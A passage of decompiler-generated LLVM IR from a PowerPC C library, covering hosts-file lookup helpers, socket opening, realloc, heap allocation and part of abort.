  br i1 %tmp37, label %dec_label_pc_10025fdc, label %dec_label_pc_10026020.backedge

dec_label_pc_10026020:                            ; preds = %dec_label_pc_10026020.backedge, %dec_label_pc_10026020.preheader
  %v0_1002602c = phi i32 [ %v0_1002602c.pre, %dec_label_pc_10026020.backedge ], [ %v0_1002602c16, %dec_label_pc_10026020.preheader ]
  store i32 %v2_10026020, i32* %r3.global-to-local, align 4
  store i32 268591156, i32* @lr, align 4
  %v3_10026030 = call i32 @fgets(i32 %v2_10026020, i32 128, i32 %v0_1002602c)
  store i32 %v3_10026030, i32* %r3.global-to-local, align 4
  %v3_10026034 = icmp eq i32 %v3_10026030, 0
  br i1 %v3_10026034, label %dec_label_pc_10026044, label %dec_label_pc_10025e2c.preheader

dec_label_pc_10025e2c.preheader:                  ; preds = %dec_label_pc_10026020
  store i32 %v2_10026020, i32* %r3.global-to-local, align 4
  %v2_10025e2c3 = load i8, i8* %v1_10025e2c2, align 4
  %v3_10025e2c4 = zext i8 %v2_10025e2c3 to i32
  store i32 %v3_10025e2c4, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* @r8, align 4
  %v3_10025e346 = icmp eq i8 %v2_10025e2c3, 0
  %v1_10025e388 = mul nuw nsw i32 %v3_10025e2c4, 2
  store i32 %v1_10025e388, i32* @r10, align 4
  br i1 %v3_10025e346, label %dec_label_pc_10026020.backedge, label %dec_label_pc_10025e40.lr.ph

dec_label_pc_10025e40.lr.ph:                      ; preds = %dec_label_pc_10025e2c.preheader
  %v3_10025e40.pre = load i32, i32* @global_var_1004513c, align 4
  br label %dec_label_pc_10025e40

dec_label_pc_10026044:                            ; preds = %dec_label_pc_10026020
  %v0_10026044 = load i32, i32* @r26, align 4
  store i32 %v0_10026044, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002604c.1382 to i32), i32* @lr, align 4
  %v1_10026048 = inttoptr i32 %v0_10026044 to i16*
  %v2_10026048 = call i32 @__GI_fclose(i16* %v1_10026048)
  store i32 %v2_10026048, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002605c

dec_label_pc_10026050:                            ; preds = %dec_label_pc_10025e0c
  %v0_10026050 = call i32 @__GI___h_errno_location()
  store i32 %v0_10026050, i32* %r3.global-to-local, align 4
  %v2_10026058 = inttoptr i32 %v0_10026050 to i32*
  store i32 3, i32* %v2_10026058, align 4
  br label %dec_label_pc_1002605c

dec_label_pc_1002605c:                            ; preds = %entry, %dec_label_pc_10026044, %dec_label_pc_10026050
  store i32 %v2_10025dc4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268591208, i32* @lr, align 4
  %v0_10026064 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_10026064, i32* %r3.global-to-local, align 4
  ret i32 %v0_10026064

; uselistorder directives
  uselistorder i32 %v3_10025e2c4, { 0, 2, 1 }
  uselistorder i32 %v1_10025fcc46, { 1, 0 }
  uselistorder i32 %v1_10025fc845, { 1, 0 }
  uselistorder i32 %v0_10025e78, { 1, 0 }
  uselistorder i32 %v1_10025ec4, { 1, 0 }
  uselistorder i8* %v1_10025ebc, { 0, 2, 1 }
  uselistorder i8 %v2_10025e8c, { 2, 0, 1 }
  uselistorder i32 %v0_10025e88, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10025e38, { 1, 0 }
  uselistorder i32 %v3_10025e2c, { 1, 0, 2 }
  uselistorder i32 %v1_10025e28, { 0, 2, 1 }
  uselistorder i32 %v2_10026020, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10025dc4, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 4, 27, 5, 6, 1, 29, 19, 26, 7, 8, 3, 9, 10, 11, 12, 13, 2, 14, 15, 16, 18, 17, 0, 20, 21, 28, 22, 23, 25, 24 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0, 6, 5 }
  uselistorder i32* @global_var_10045270.1367, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_1004eed4.1369 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32* @r1, { 33, 0, 34, 10, 2, 11, 30, 31, 12, 14, 13, 1, 3, 4, 5, 6, 7, 8, 9, 35, 36, 37, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 32, 38 }
  uselistorder i32 ptrtoint (i32* @global_var_1004eee4.1213 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10045068.1211 to i32), { 9, 16, 1, 12, 17, 0, 13, 18, 2, 14, 19, 4, 3, 10, 20, 6, 5, 11, 8, 7, 15 }
  uselistorder label %dec_label_pc_1002605c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026014, { 1, 0 }
  uselistorder label %dec_label_pc_10025f98, { 1, 0 }
  uselistorder label %dec_label_pc_10025fb4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10025f40, { 1, 0 }
  uselistorder label %dec_label_pc_10025efc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10025ef4, { 1, 0 }
  uselistorder label %dec_label_pc_10025ebc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10025e8c, { 1, 0 }
  uselistorder label %dec_label_pc_10026020.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_10026020.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_1002607c = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268591296, i32* @lr, align 4
  %v8_100260bc = inttoptr i32 %arg3 to i32*
  %v9_100260bc = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v8_100260bc, i32 %arg4, i32 %arg5, i32 %v4_1002607c)
  ret i32 %v9_100260bc
}

define i32 @__get_hosts_byaddr_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-80 = alloca i32, align 4
  %v3_100260dc = icmp eq i32 %arg3, 2
  store i32 %arg3, i32* @r31, align 4
  store i32 %arg4, i32* @r30, align 4
  store i32 %arg5, i32* @r28, align 4
  store i32 %arg6, i32* @r27, align 4
  store i32 %arg7, i32* @r26, align 4
  %v0_10026104 = load i32, i32* @r10, align 4
  store i32 %v0_10026104, i32* @r25, align 4
  br i1 %v3_100260dc, label %dec_label_pc_10026114, label %dec_label_pc_1002610c

dec_label_pc_1002610c:                            ; preds = %entry
  %v3_100260e0 = icmp eq i32 %arg3, 10
  br i1 %v3_100260e0, label %dec_label_pc_1002611c, label %dec_label_pc_1002616c

dec_label_pc_10026114:                            ; preds = %entry
  %v3_100260e8 = icmp eq i32 %arg2, 4
  br i1 %v3_100260e8, label %dec_label_pc_10026124, label %dec_label_pc_1002616c

dec_label_pc_1002611c:                            ; preds = %dec_label_pc_1002610c
  %v3_1002611c = icmp eq i32 %arg2, 16
  br i1 %v3_1002611c, label %dec_label_pc_10026124, label %dec_label_pc_1002616c

dec_label_pc_10026124:                            ; preds = %dec_label_pc_10026114, %dec_label_pc_1002611c
  %v2_10026124 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10026124, i32* @r29, align 4
  store i32 268591420, i32* @lr, align 4
  %v4_10026138 = call i32 @__GI_inet_ntop(i32 %arg3, i32 %arg1, i32 %v2_10026124, i32 46)
  %v0_10026140 = load i32, i32* @r31, align 4
  %v0_10026144 = load i32, i32* @r30, align 4
  %v0_10026148 = load i32, i32* @r28, align 4
  %v0_1002614c = load i32, i32* @r27, align 4
  %v0_10026150 = load i32, i32* @r26, align 4
  store i32 %v0_10026150, i32* @r10, align 4
  %v0_1002615c = load i32, i32* @r25, align 4
  store i32 ptrtoint (i32* @global_var_10026164.1384 to i32), i32* @lr, align 4
  %v8_10026160 = inttoptr i32 %v0_10026144 to i32*
  %v9_10026160 = call i32 @__read_etc_hosts_r(i32 0, i32 %v2_10026124, i32 %v0_10026140, i32 2, i32* %v8_10026160, i32 %v0_10026148, i32 %v0_1002614c, i32 %v0_1002615c)
  br label %dec_label_pc_1002616c

dec_label_pc_1002616c:                            ; preds = %dec_label_pc_1002610c, %dec_label_pc_1002611c, %dec_label_pc_10026114, %dec_label_pc_10026124
  %storemerge = phi i32 [ %v9_10026160, %dec_label_pc_10026124 ], [ 0, %dec_label_pc_10026114 ], [ 0, %dec_label_pc_1002611c ], [ 0, %dec_label_pc_1002610c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1002616c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10026124, { 1, 0 }
}

define i32 @__opensock() local_unnamed_addr {
entry:
  %v0_10026184 = load i32, i32* @lr, align 4
  store i32 268591520, i32* @lr, align 4
  %v3_1002619c = call i32 @socket(i32 10, i32 2, i32 0)
  %tmp5 = icmp sgt i32 %v3_1002619c, -1
  br i1 %tmp5, label %dec_label_pc_100261c8, label %dec_label_pc_100261b0

dec_label_pc_100261b0:                            ; preds = %entry
  store i32 %v0_10026184, i32* @lr, align 4
  %v3_100261c4 = call i32 @socket(i32 2, i32 2, i32 0)
  br label %dec_label_pc_100261c8

dec_label_pc_100261c8:                            ; preds = %entry, %dec_label_pc_100261b0
  %v0_100261d8 = phi i32 [ %v3_1002619c, %entry ], [ %v3_100261c4, %dec_label_pc_100261b0 ]
  ret i32 %v0_100261d8

; uselistorder directives
  uselistorder label %dec_label_pc_100261c8, { 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v3_100261e4 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_100261e4, label %dec_label_pc_100261f8, label %dec_label_pc_10026204

dec_label_pc_100261f8:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_100261fc.1385 to i32), i32* @lr, align 4
  %v0_100261f8 = call i32 @free()
  br label %dec_label_pc_10026210

dec_label_pc_10026204:                            ; preds = %entry
  %v3_10026204 = icmp eq i32 %arg1, 0
  br i1 %v3_10026204, label %dec_label_pc_10026210, label %dec_label_pc_1002621c

dec_label_pc_10026210:                            ; preds = %dec_label_pc_10026204, %dec_label_pc_100261f8
  %storemerge = phi i32 [ 0, %dec_label_pc_100261f8 ], [ %arg2, %dec_label_pc_10026204 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268591636, i32* @lr, align 4
  %v0_10026210 = call i32 @malloc()
  store i32 %v0_10026210, i32* @r28, align 4
  br label %dec_label_pc_100262f4

dec_label_pc_1002621c:                            ; preds = %dec_label_pc_10026204
  %v1_1002621c = add i32 %arg2, 7
  %v1_10026220 = add i32 %arg1, -4
  store i32 %v1_10026220, i32* @r27, align 4
  %v1_10026224 = call i32 @__asm_rlwinm(i32 %v1_1002621c, i32 0, i32 0, i32 29)
  store i32 %v1_10026224, i32* @r31, align 4
  %v2_10026228 = inttoptr i32 %v1_10026220 to i32*
  %v3_10026228 = load i32, i32* %v2_10026228, align 4
  store i32 %v3_10026228, i32* @r30, align 4
  %v2_1002622c = icmp ugt i32 %v1_10026224, 11
  br i1 %v2_1002622c, label %dec_label_pc_10026238, label %dec_label_pc_10026234

dec_label_pc_10026234:                            ; preds = %dec_label_pc_1002621c
  store i32 12, i32* @r31, align 4
  br label %dec_label_pc_10026238

dec_label_pc_10026238:                            ; preds = %dec_label_pc_1002621c, %dec_label_pc_10026234
  %v0_100262b8 = phi i32 [ %v1_10026224, %dec_label_pc_1002621c ], [ 12, %dec_label_pc_10026234 ]
  %v3_10026238 = icmp ugt i32 %v0_100262b8, %v3_10026228
  br i1 %v3_10026238, label %dec_label_pc_10026240, label %dec_label_pc_100262b8

dec_label_pc_10026240:                            ; preds = %dec_label_pc_10026238
  store i32 ptrtoint (i32* @global_var_1004da14.970 to i32), i32* @r29, align 4
  store i32 268591696, i32* @lr, align 4
  %v1_1002624c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da14.970 to i32))
  %v0_10026254 = load i32, i32* @r27, align 4
  %v1_10026254 = load i32, i32* @r30, align 4
  %v2_10026254 = add i32 %v1_10026254, %v0_10026254
  %v1_10026258 = load i32, i32* @r31, align 4
  %v2_10026258 = sub i32 %v1_10026258, %v1_10026254
  %v4_10026260 = call i32 @__heap_alloc_at(i32* nonnull @global_var_10045130, i32 %v2_10026254, i32 %v2_10026258)
  store i32 %v4_10026260, i32* @r27, align 4
  %v0_10026268 = load i32, i32* @r29, align 4
  store i32 %v0_10026268, i32* @r3, align 4
  store i32 268591728, i32* @lr, align 4
  %v0_1002626c = call i32 @pthread_mutex_unlock()
  %v0_10026270 = load i32, i32* @r27, align 4
  %v3_10026270 = icmp eq i32 %v0_10026270, 0
  br i1 %v3_10026270, label %dec_label_pc_10026284, label %dec_label_pc_10026278

dec_label_pc_10026278:                            ; preds = %dec_label_pc_10026240
  %v0_10026278 = load i32, i32* @r30, align 4
  %v2_10026278 = add i32 %v0_10026278, %v0_10026270
  %v1_1002627c = load i32, i32* @r28, align 4
  %v2_1002627c = add i32 %v1_1002627c, -4
  %v3_1002627c = inttoptr i32 %v2_1002627c to i32*
  store i32 %v2_10026278, i32* %v3_1002627c, align 4
  br label %dec_label_pc_100262f4

dec_label_pc_10026284:                            ; preds = %dec_label_pc_10026240
  %v0_10026284 = load i32, i32* @r31, align 4
  %v1_10026284 = add i32 %v0_10026284, -4
  store i32 %v1_10026284, i32* @r3, align 4
  store i32 268591756, i32* @lr, align 4
  %v0_10026288 = call i32 @malloc()
  store i32 %v0_10026288, i32* @r3, align 4
  store i32 %v0_10026288, i32* @r31, align 4
  %v3_1002628c = icmp eq i32 %v0_10026288, 0
  br i1 %v3_1002628c, label %dec_label_pc_10026294, label %dec_label_pc_1002629c

dec_label_pc_10026294:                            ; preds = %dec_label_pc_10026284
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100262f4

dec_label_pc_1002629c:                            ; preds = %dec_label_pc_10026284
  %v0_1002629c = load i32, i32* @r28, align 4
  store i32 %v0_1002629c, i32* @r4, align 4
  %v0_100262a0 = load i32, i32* @r30, align 4
  %v1_100262a0 = add i32 %v0_100262a0, -4
  store i32 %v1_100262a0, i32* @r5, align 4
  store i32 268591784, i32* @lr, align 4
  %v0_100262a4 = call i32 @memcpy()
  %v0_100262a8 = load i32, i32* @r28, align 4
  store i32 %v0_100262a8, i32* @r3, align 4
  store i32 268591792, i32* @lr, align 4
  %v0_100262ac = call i32 @free()
  %v0_100262b0 = load i32, i32* @r31, align 4
  store i32 %v0_100262b0, i32* @r28, align 4
  br label %dec_label_pc_100262f4

dec_label_pc_100262b8:                            ; preds = %dec_label_pc_10026238
  %v1_100262b8 = add i32 %v0_100262b8, 28
  %v3_100262bc = icmp ugt i32 %v1_100262b8, %v3_10026228
  br i1 %v3_100262bc, label %dec_label_pc_100262f4, label %dec_label_pc_100262c4

dec_label_pc_100262c4:                            ; preds = %dec_label_pc_100262b8
  store i32 ptrtoint (i32* @global_var_1004da14.970 to i32), i32* @r29, align 4
  store i32 268591828, i32* @lr, align 4
  %v1_100262d0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da14.970 to i32))
  %v0_100262d8 = load i32, i32* @r27, align 4
  %v1_100262d8 = load i32, i32* @r31, align 4
  %v2_100262d8 = add i32 %v1_100262d8, %v0_100262d8
  %v1_100262dc = load i32, i32* @r30, align 4
  %v2_100262dc = sub i32 %v1_100262dc, %v1_100262d8
  store i32 268591848, i32* @lr, align 4
  %v4_100262e4 = call i32 @__heap_free(i32* nonnull @global_var_10045130, i32 %v2_100262d8, i32 %v2_100262dc)
  %v0_100262e8 = load i32, i32* @r29, align 4
  store i32 %v0_100262e8, i32* @r3, align 4
  store i32 268591856, i32* @lr, align 4
  %v0_100262ec = call i32 @pthread_mutex_unlock()
  %v0_100262f0 = load i32, i32* @r31, align 4
  %v1_100262f0 = load i32, i32* @r28, align 4
  %v2_100262f0 = add i32 %v1_100262f0, -4
  %v3_100262f0 = inttoptr i32 %v2_100262f0 to i32*
  store i32 %v0_100262f0, i32* %v3_100262f0, align 4
  br label %dec_label_pc_100262f4

dec_label_pc_100262f4:                            ; preds = %dec_label_pc_100262b8, %dec_label_pc_1002629c, %dec_label_pc_10026294, %dec_label_pc_10026278, %dec_label_pc_10026210, %dec_label_pc_100262c4
  %v0_100262f8 = load i32, i32* @r28, align 4
  ret i32 %v0_100262f8

; uselistorder directives
  uselistorder i32 %v1_100262d8, { 1, 0 }
  uselistorder i32 %v1_10026254, { 1, 0 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32* @global_var_10045130, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1004da14.970 to i32), { 0, 6, 1, 7, 8, 2, 3, 9, 4, 10, 5, 11 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100262f4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10026238, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1002630c = load i32, i32* %arg1, align 4
  store i32 %v2_1002630c, i32* @r11, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_10026314 = add i32 %arg3, 3
  %v3_100263983 = icmp eq i32 %v2_1002630c, 0
  br i1 %v3_100263983, label %dec_label_pc_100263a0, label %dec_label_pc_1002631c

dec_label_pc_1002631c:                            ; preds = %entry, %dec_label_pc_10026394
  %v0_10026394 = phi i32 [ %v3_10026394, %dec_label_pc_10026394 ], [ %v2_1002630c, %entry ]
  %v1_1002631c = inttoptr i32 %v0_10026394 to i32*
  %v2_1002631c = load i32, i32* %v1_1002631c, align 4
  %v2_10026320 = sub i32 %v0_10026394, %v2_1002631c
  %v1_10026324 = add i32 %v2_10026320, 12
  store i32 %v1_10026324, i32* @r9, align 4
  %v3_10026328 = icmp ugt i32 %v1_10026324, %arg2
  br i1 %v3_10026328, label %dec_label_pc_10026394, label %dec_label_pc_10026330

dec_label_pc_10026330:                            ; preds = %dec_label_pc_1002631c
  %v4_10026328 = icmp eq i32 %v1_10026324, %arg2
  br i1 %v4_10026328, label %dec_label_pc_10026338, label %dec_label_pc_100263a0

dec_label_pc_10026338:                            ; preds = %dec_label_pc_10026330
  %v1_10026338 = call i32 @__asm_rlwinm(i32 %v1_10026314, i32 0, i32 0, i32 29)
  %v2_1002633c = icmp ult i32 %v2_1002631c, %v1_10026338
  br i1 %v2_1002633c, label %dec_label_pc_100263a0, label %dec_label_pc_10026344

dec_label_pc_10026344:                            ; preds = %dec_label_pc_10026338
  %v1_10026344 = add i32 %v1_10026338, 44
  %v2_10026348 = icmp ult i32 %v2_1002631c, %v1_10026344
  br i1 %v2_10026348, label %dec_label_pc_10026350, label %dec_label_pc_10026384

dec_label_pc_10026350:                            ; preds = %dec_label_pc_10026344
  %v0_10026350 = load i32, i32* @r11, align 4
  %v1_10026350 = add i32 %v0_10026350, 4
  %v2_10026350 = inttoptr i32 %v1_10026350 to i32*
  %v3_10026350 = load i32, i32* %v2_10026350, align 4
  %v3_10026354 = icmp eq i32 %v3_10026350, 0
  br i1 %v3_10026354, label %dec_label_pc_10026364, label %dec_label_pc_1002635c

dec_label_pc_1002635c:                            ; preds = %dec_label_pc_10026350
  %v1_1002635c = add i32 %v0_10026350, 8
  %v2_1002635c = inttoptr i32 %v1_1002635c to i32*
  %v3_1002635c = load i32, i32* %v2_1002635c, align 4
  %v2_10026360 = add i32 %v3_10026350, 8
  %v3_10026360 = inttoptr i32 %v2_10026360 to i32*
  store i32 %v3_1002635c, i32* %v3_10026360, align 4
  %v0_10026364.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10026364

dec_label_pc_10026364:                            ; preds = %dec_label_pc_10026350, %dec_label_pc_1002635c
  %v0_10026364 = phi i32 [ %v0_10026350, %dec_label_pc_10026350 ], [ %v0_10026364.pre, %dec_label_pc_1002635c ]
  %v1_10026364 = add i32 %v0_10026364, 8
  %v2_10026364 = inttoptr i32 %v1_10026364 to i32*
  %v3_10026364 = load i32, i32* %v2_10026364, align 4
  store i32 %v3_10026364, i32* @r10, align 4
  %v1_10026368 = add i32 %v0_10026364, 4
  %v2_10026368 = inttoptr i32 %v1_10026368 to i32*
  %v3_10026368 = load i32, i32* %v2_10026368, align 4
  store i32 %v3_10026368, i32* @r9, align 4
  %v3_1002636c = icmp eq i32 %v3_10026364, 0
  br i1 %v3_1002636c, label %dec_label_pc_1002637c, label %dec_label_pc_10026374

dec_label_pc_10026374:                            ; preds = %dec_label_pc_10026364
  %v2_10026374 = add i32 %v3_10026364, 4
  %v3_10026374 = inttoptr i32 %v2_10026374 to i32*
  store i32 %v3_10026368, i32* %v3_10026374, align 4
  ret i32 %v2_1002631c

dec_label_pc_1002637c:                            ; preds = %dec_label_pc_10026364
  %v1_1002637c = load i32, i32* @r8, align 4
  %v2_1002637c = inttoptr i32 %v1_1002637c to i32*
  store i32 %v3_10026368, i32* %v2_1002637c, align 4
  ret i32 %v2_1002631c

dec_label_pc_10026384:                            ; preds = %dec_label_pc_10026344
  %v2_10026384 = sub i32 %v2_1002631c, %v1_10026338
  %v1_1002638c = load i32, i32* @r11, align 4
  %v2_1002638c = inttoptr i32 %v1_1002638c to i32*
  store i32 %v2_10026384, i32* %v2_1002638c, align 4
  ret i32 %v1_10026338

dec_label_pc_10026394:                            ; preds = %dec_label_pc_1002631c
  %v1_10026394 = add i32 %v0_10026394, 4
  %v2_10026394 = inttoptr i32 %v1_10026394 to i32*
  %v3_10026394 = load i32, i32* %v2_10026394, align 4
  store i32 %v3_10026394, i32* @r11, align 4
  %v3_10026398 = icmp eq i32 %v3_10026394, 0
  br i1 %v3_10026398, label %dec_label_pc_10026398.dec_label_pc_100263a0.loopexit_crit_edge, label %dec_label_pc_1002631c

dec_label_pc_10026398.dec_label_pc_100263a0.loopexit_crit_edge: ; preds = %dec_label_pc_10026394
  br label %dec_label_pc_100263a0

dec_label_pc_100263a0:                            ; preds = %entry, %dec_label_pc_10026398.dec_label_pc_100263a0.loopexit_crit_edge, %dec_label_pc_10026330, %dec_label_pc_10026338
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10026394, { 1, 2, 0 }
  uselistorder i32 %v0_10026364, { 1, 0 }
  uselistorder i32 %v1_10026338, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1002631c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10026394, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100263a0, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10026364, { 1, 0 }
  uselistorder label %dec_label_pc_1002631c, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_100263dc.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v2_100263bc = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_100263bc, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_100263c8.1387 to i32), i32* @lr, align 4
  %v1_100263c4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045080.1386 to i32))
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v1_100263e032 = load i32, i32* @r29, align 4
  %v3_100263e033 = add i32 %v1_100263e032, 124
  %v4_100263e034 = inttoptr i32 %v3_100263e033 to i32*
  store i32 0, i32* %v4_100263e034, align 4
  %v0_100263e435 = load i32, i32* %r9.global-to-local, align 4
  %v1_100263e436 = add i32 %v0_100263e435, -1
  store i32 %v1_100263e436, i32* %r9.global-to-local, align 4
  %v0_100263e837 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100263e838 = add i32 %v0_100263e837, -1
  store i32 %v1_100263e838, i32* %ctr.global-to-local, align 4
  %v2_100263e839 = icmp eq i32 %v1_100263e838, 0
  br i1 %v2_100263e839, label %dec_label_pc_100263ec, label %dec_label_pc_100263dc.dec_label_pc_100263dc_crit_edge

dec_label_pc_100263dc.dec_label_pc_100263dc_crit_edge: ; preds = %dec_label_pc_100263dc.lr.ph, %dec_label_pc_100263dc.dec_label_pc_100263dc_crit_edge
  %v1_100263e440 = phi i32 [ %v1_100263e4, %dec_label_pc_100263dc.dec_label_pc_100263dc_crit_edge ], [ %v1_100263e436, %dec_label_pc_100263dc.lr.ph ]
  %v0_100263e0.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_100263dc = mul i32 %v1_100263e440, 4
  %v1_100263e0 = load i32, i32* @r29, align 4
  %v3_100263e0 = add i32 %v1_100263e0, %v1_100263dc
  %v4_100263e0 = inttoptr i32 %v3_100263e0 to i32*
  store i32 %v0_100263e0.pre, i32* %v4_100263e0, align 4
  %v0_100263e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100263e4 = add i32 %v0_100263e4, -1
  store i32 %v1_100263e4, i32* %r9.global-to-local, align 4
  %v0_100263e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100263e8 = add i32 %v0_100263e8, -1
  store i32 %v1_100263e8, i32* %ctr.global-to-local, align 4
  %v2_100263e8 = icmp eq i32 %v1_100263e8, 0
  br i1 %v2_100263e8, label %dec_label_pc_100263ec, label %dec_label_pc_100263dc.dec_label_pc_100263dc_crit_edge

dec_label_pc_100263ec:                            ; preds = %dec_label_pc_100263dc.dec_label_pc_100263dc_crit_edge, %dec_label_pc_100263dc.lr.ph
  store i32 %v2_100263bc, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_100263f4 = call i32 @__sigaddset()
  %v3_100263f8 = icmp eq i32 %v0_100263f4, 0
  br i1 %v3_100263f8, label %dec_label_pc_10026400, label %dec_label_pc_10026410

dec_label_pc_10026400:                            ; preds = %dec_label_pc_100263ec
  store i32 268592144, i32* @lr, align 4
  %v3_1002640c = call i32 @__GI_sigprocmask(i32 1, i32 %v2_100263bc, i32 0)
  br label %dec_label_pc_10026410

dec_label_pc_10026410:                            ; preds = %dec_label_pc_100263ec, %dec_label_pc_10026400
  store i32 268697600, i32* @r9, align 4
  %v3_10026414 = load i32, i32* @global_var_10045274.1388, align 4
  %v3_10026418 = icmp eq i32 %v3_10026414, 0
  br i1 %v3_10026418, label %dec_label_pc_10026420, label %dec_label_pc_10026448

dec_label_pc_10026420:                            ; preds = %dec_label_pc_10026410
  store i32 1, i32* @global_var_10045274.1388, align 4
  br label %dec_label_pc_10026428

dec_label_pc_10026428:                            ; preds = %dec_label_pc_100264a4, %dec_label_pc_10026420
  store i32 ptrtoint (i32* @global_var_10045080.1386 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10026438.1389 to i32), i32* @lr, align 4
  %v0_10026434 = call i32 @pthread_mutex_unlock()
  store i32 268592192, i32* @lr, align 4
  %v1_1002643c = call i32 @__GI_raise(i32 6)
  %v0_10026440 = load i32, i32* @r29, align 4
  store i32 268592200, i32* @lr, align 4
  %v1_10026444 = call i32 @pthread_mutex_lock(i32 %v0_10026440)
  %v3_1002644c.pre = load i32, i32* @global_var_10045274.1388, align 4
  br label %dec_label_pc_10026448

dec_label_pc_10026448:                            ; preds = %dec_label_pc_10026410, %dec_label_pc_10026428
  %v0_100264c0 = phi i32 [ %v3_10026414, %dec_label_pc_10026410 ], [ %v3_1002644c.pre, %dec_label_pc_10026428 ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10026450 = icmp eq i32 %v0_100264c0, 1
  br i1 %v3_10026450, label %dec_label_pc_10026490.lr.ph, label %dec_label_pc_100264c0

dec_label_pc_10026490.lr.ph:                      ; preds = %dec_label_pc_10026448
  %v2_1002645c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1002645c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 140, i32* @r5, align 4
  store i32 2, i32* @global_var_10045274.1388, align 4
  store i32 ptrtoint (i32* @global_var_10026470.1390 to i32), i32* @lr, align 4
  %v0_1002646c = call i32 @__GI_memset()
  store i32 %v2_100263bc, i32* @r8, align 4
  store i32 -1, i32* @r10, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1002649423 = add i32 %v2_100263bc, 124
  store i32 %v2_1002649423, i32* %r9.global-to-local, align 4
  %v2_1002649824 = add i32 %v2_100263bc, 256
  %v3_1002649825 = inttoptr i32 %v2_1002649824 to i32*
  store i32 -1, i32* %v3_1002649825, align 4
  %v0_1002649c26 = load i32, i32* %r11.global-to-local, align 4
  %v1_1002649c27 = add i32 %v0_1002649c26, -1
  store i32 %v1_1002649c27, i32* @r11, align 4
